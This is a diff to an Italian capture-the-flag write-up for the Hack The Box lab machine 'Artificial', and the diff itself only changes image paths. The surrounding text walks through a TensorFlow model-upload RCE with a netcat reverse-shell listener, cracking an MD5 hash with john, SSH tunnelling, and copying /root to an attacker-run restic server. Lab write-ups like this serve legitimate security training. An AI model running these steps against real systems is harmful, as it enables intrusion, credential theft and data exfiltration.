@@ -33,11 +33,11 @@ Porte: 22,80
 ## Porta 80
 
 Probabilmente non si riesce a visitare la porta http 80 sul browser quindi aggiornare `/etc/hosts con: <IP MACCHINA> artificial.htb`
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-14-56-image.png)
+![](images\2025-10-22-23-14-56-image.png)
 
 Creare un account e loggarsi, poi scaricare il Dockerfile
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-15-41-image.png)Sfrutteremo questo exploit: https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py
+![](images\2025-10-22-23-15-41-image.png)Sfrutteremo questo exploit: https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py
 
 ```python
 import tensorflow as tf
@@ -82,23 +82,23 @@ Quando si avvia il container docker creato saremo in una shell bash:
 
 Ora dal sito uploadare il file `exploit.h5`
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-17-52-image.png)mettersi in ascolto sulla porta 4444 ( `nc -nlvp 4444` ) e cliccare su `View Predictions` sul sito
+![](images\2025-10-22-23-17-52-image.png)mettersi in ascolto sulla porta 4444 ( `nc -nlvp 4444` ) e cliccare su `View Predictions` sul sito
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-18-49-image.png)Siamo dentro con l'utente `app`
+![](images\2025-10-22-23-18-49-image.png)Siamo dentro con l'utente `app`
 Vediamo che nella cartella /home ci sono due cartelle: app e gael che probabilmente è un utente che troviamo anche in /etc/passwd
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-19-45-image.png)
+![](images\2025-10-22-23-19-45-image.png)
 
 ## User gael
 
 Con [[linpeas]]troviamo il file `/home/app/app/instance/users.db`
 che possiamo esaminare:
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-20-17-image.png)Questa chiave `c99175974b6e192936d97224638a34f8` è un hash MD5 che potrebbe essere la password dell'user gael
+![](images\2025-10-22-23-20-17-image.png)Questa chiave `c99175974b6e192936d97224638a34f8` è un hash MD5 che potrebbe essere la password dell'user gael
 
 Creiamo un file `hash.txt` che contiene la hash di gael e proviamo a craccarla con [[johntheripper]]
 `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-md5`
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-20-48-image.png)Troviamo la password: `mattp005numbertwo`
+![](images\2025-10-22-23-20-48-image.png)Troviamo la password: `mattp005numbertwo`
 
 Con la password trovata possiamo entrare nell'utente gael con ssh `ssh gael@10.10.11.74`
 Nella cartella `/home/gael` troviamo il file `user.txt` con la user flag
@@ -109,7 +109,7 @@ Con [[linpeas]]si trova il file `backrest_backup.tar.gz` nella cartella `/var/ba
 Scarichiamolo sul nostro pc e apriamolo ( `tar -xvf backrest_backup.tar.gz` )
 Nella cartella `backrest/.config/backrest` troviamo il file `config.json`:
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-21-39-image.png)Questa è una **password cifrata con bcrypt** Analizziamo i dettagli:
+![](images\2025-10-22-23-21-39-image.png)Questa è una **password cifrata con bcrypt** Analizziamo i dettagli:
 
 ### Struttura del dato:
 
@@ -153,7 +153,7 @@ Comando `ss`:
 - **Stato** della connessione
 
 Vediamo che la porta 9898 è utilizzata:
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-22-29-image.png)
+![](images\2025-10-22-23-22-29-image.png)
 
 Sulla nostra macchina, con Il comando `ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898` creiamo un **tunnel SSH con port forwarding locale**. 
 
@@ -169,26 +169,26 @@ Sulla nostra macchina, con Il comando `ssh gael@10.10.11.74 -L 9898:127.0.0.1:9
    - (cioè a un servizio in esecuzione sul server stesso)
 
 Con `localhost:9898` nel nostro browser entriamo nel servizio backrest sulla macchina vittima
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-23-10-image.png)
+![](images\2025-10-22-23-23-10-image.png)
 
 Accediamo con Username: `backrest_root` e Password: `!@#$%^`
 Dopo aver fatto l'accesso dovremo creare una nuova repo (+ Add Repo)
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-23-38-image.png)mettendo un nome (repox), URI /opt e una password (123456)
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-24-15-image.png)
+![](images\2025-10-22-23-23-38-image.png)mettendo un nome (repox), URI /opt e una password (123456)
+![](images\2025-10-22-23-24-15-image.png)
 
 Mettiamoci in ascolto sulla nostra macchina con 
 `./rest-server --path /tmp/restic-data --listen :12345 --no-auth`
 
 Poi sul sito selezioniamo la repo creata e clicchiamo su Run Command
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-24-48-image.png)Poi inseriamo i seguenti comandi:
+![](images\2025-10-22-23-24-48-image.png)Poi inseriamo i seguenti comandi:
 `-r rest:http://<NOSTRO IP>:12345/repox init`
 `-r rest:http://<NOSTRO IP>:12345/repox backup /root`
 
 Sulla nostra macchina inseriamo i comandi:
 `restic -r /tmp/restic-data/repox snapshots`
 
-![](C:\Users\andre\AppData\Roaming\marktext\images\2025-10-22-23-25-24-image.png)`restic -r /tmp/restic-data/repox restore f8118067 --target ./restore`   (f8118067 è l'ID della repo)
+![](images\2025-10-22-23-25-24-image.png)`restic -r /tmp/restic-data/repox restore f8118067 --target ./restore`   (f8118067 è l'ID della repo)
 
 Poi con il comando `cat restore/root/root.txt` otteniamo la flag root
